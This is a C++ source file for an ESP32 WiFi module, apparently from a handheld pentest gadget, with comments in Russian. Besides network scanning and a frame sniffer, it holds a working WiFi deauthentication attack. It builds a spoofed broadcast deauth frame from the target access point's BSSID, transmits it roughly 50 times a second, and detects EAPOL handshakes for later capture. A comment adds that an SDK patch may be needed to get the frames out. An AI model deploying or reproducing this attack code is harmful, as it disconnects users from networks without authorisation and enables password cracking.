#include "WifiModule.h"
#include "core/Logger.h"
#include <WiFi.h>
#include <esp_wifi.h>

static const char* TAG = "Wifi";

WifiModule* WifiModule::_self = nullptr;

static volatile uint32_t s_sniffFrames = 0;
static volatile uint32_t s_hsFrames    = 0;

// Детектор EAPOL в data-кадре (LLC/SNAP ... ethertype 0x888E) — рукопожатие.
static void deauthHsCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;
    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
    int len = pkt->rx_ctrl.sig_len;
    const uint8_t* d = pkt->payload;
    for (int i = 0; i + 8 < len && i < 80; ++i) {
        if (d[i] == 0xAA && d[i + 1] == 0xAA && d[i + 2] == 0x03 &&
            d[i + 6] == 0x88 && d[i + 7] == 0x8E) { s_hsFrames++; break; }
    }
}

// Шаблон кадра деаутентификации (broadcast). addr2/addr3 = BSSID цели.
static uint8_t s_deauth[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // addr1 = dst (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // addr2 = src (BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // addr3 = BSSID
    0x00, 0x00,                           // seq
    0x07, 0x00                            // reason: class-3 frame from nonassoc
};

static void snifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    (void)buf; (void)type;
    s_sniffFrames++;
}

bool WifiModule::init() {
    _self = this;
    // Радио НЕ включаем при старте (экономия энергии). Поднимается лениво в
    // scan()/startDeauth(), гасится radioOff() при выходе с экрана.
    WiFi.mode(WIFI_OFF);
    LOGI(TAG, "WiFi ready (radio off)");
    return true;
}

void WifiModule::radioOff() {
    stopDeauth();
    stopSniffer();
    if (_scanActive) WiFi.scanDelete();
    _scanActive = false;
    WiFi.mode(WIFI_OFF);
}

int WifiModule::scan() {
    // Экран WiFi пока использует синхронный вариант, чтобы не менять его UX.
    // Wardrive вызывает beginScan/finishScan и не останавливает интерфейс.
    stopSniffer();
    stopDeauth();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(50);
    int n = WiFi.scanNetworks(false, true);
    if (n >= 0) collectScan(n);
    WiFi.scanDelete();
    _scanActive = false;
    return (int)_aps.size();
}

void WifiModule::beginScan() {
    if (_scanActive) return;
    stopSniffer();
    stopDeauth();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    // Асинхронный драйвер сканирует сам; UI и GPS продолжают обслуживаться.
    WiFi.scanNetworks(true, true);
    _scanActive = true;
}

void WifiModule::collectScan(int n) {
    _aps.clear();
    for (int i = 0; i < n; ++i) {
        ApInfo a;
        a.ssid    = WiFi.SSID(i);
        a.rssi    = WiFi.RSSI(i);
        a.channel = WiFi.channel(i);
        a.locked  = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        const uint8_t* b = WiFi.BSSID(i);
        if (b) memcpy(a.bssid, b, 6);
        if (a.ssid.isEmpty()) a.ssid = "<hidden>";
        _aps.push_back(a);
    }
    LOGI(TAG, "scan: %d APs", (int)_aps.size());
}

bool WifiModule::finishScan() {
    if (!_scanActive) return true;
    int n = WiFi.scanComplete();
    if (n == WIFI_SCAN_RUNNING) return false;
    if (n >= 0) collectScan(n);
    else _aps.clear();
    WiFi.scanDelete();
    _scanActive = false;
    return true;
}

void WifiModule::startDeauth(int apIndex) {
    if (apIndex < 0 || apIndex >= (int)_aps.size()) return;
    _deauthIdx = apIndex;
    _deauthActive = true;
    s_hsFrames = 0;
    esp_wifi_set_promiscuous(true);            // нужно для raw-tx + захвата
    esp_wifi_set_promiscuous_rx_cb(&deauthHsCb);   // детектор рукопожатий
    LOGW(TAG, "deauth+handshake on %s", _aps[apIndex].ssid.c_str());
}

void WifiModule::stopDeauth() {
    if (!_deauthActive) return;
    _deauthActive = false;
    _deauthIdx = -1;
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    if (!_sniffActive) esp_wifi_set_promiscuous(false);
}

void WifiModule::update(uint32_t now) {
    if (!_deauthActive || _deauthIdx < 0) return;
    if (now - _lastTx < 20) return;            // ~50 кадров/с
    _lastTx = now;

    const ApInfo& ap = _aps[_deauthIdx];
    esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
    memcpy(&s_deauth[10], ap.bssid, 6);
    memcpy(&s_deauth[16], ap.bssid, 6);
    // ПРИМЕЧАНИЕ: на части версий ESP-IDF esp_wifi_80211_tx отбрасывает
    // deauth-кадры — требуется патч SDK (как patch.py в Bruce).
    for (int i = 0; i < 3; ++i)
        esp_wifi_80211_tx(WIFI_IF_STA, s_deauth, sizeof(s_deauth), false);
}

void WifiModule::startSniffer() {
    s_sniffFrames = 0;
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&snifferCb);
    _sniffActive = true;
    LOGI(TAG, "sniffer started");
}

void WifiModule::stopSniffer() {
    if (!_sniffActive) return;
    _sniffActive = false;
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    if (!_deauthActive) esp_wifi_set_promiscuous(false);
}

uint32_t WifiModule::sniffCount() const { return s_sniffFrames; }
uint32_t WifiModule::handshakeCount() const { return s_hsFrames; }
